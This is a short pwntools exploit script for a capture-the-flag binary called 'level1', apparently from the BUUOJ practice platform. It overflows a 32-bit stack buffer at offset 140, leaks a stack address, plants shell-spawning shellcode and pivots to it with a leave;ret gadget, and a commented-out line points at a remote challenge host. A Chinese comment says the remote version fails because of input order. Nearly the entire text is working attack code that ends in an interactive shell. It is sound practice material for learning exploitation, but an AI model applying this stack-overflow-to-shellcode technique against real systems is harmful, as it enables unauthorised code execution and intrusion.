#Made by fly_autumn
#x86 ret2shellcode
from pwn import *
p = process("./level1")
#p = remote("node5.buuoj.cn",28049)
elf = ELF("./level1")
context(os="linux",arch="i386")

offset = 140
shellcode = asm(shellcraft.sh())
leave_ret = 0x80484b5

p.recvuntil(b"0x")
stack_addr = int(p.recv(8),16)-0x10
log.success("stack addr: "+hex(stack_addr))
payload = bytes(shellcode)
payload = payload.ljust(offset-4,b"\x00")
payload += p32(stack_addr) + p32(leave_ret)
p.recv()
p.sendline(payload)
#这个题远程有问题，是先输入再输出的，所以远程下这个exp用不了

p.interactive()
#ffffcd40 -> ffffcd30
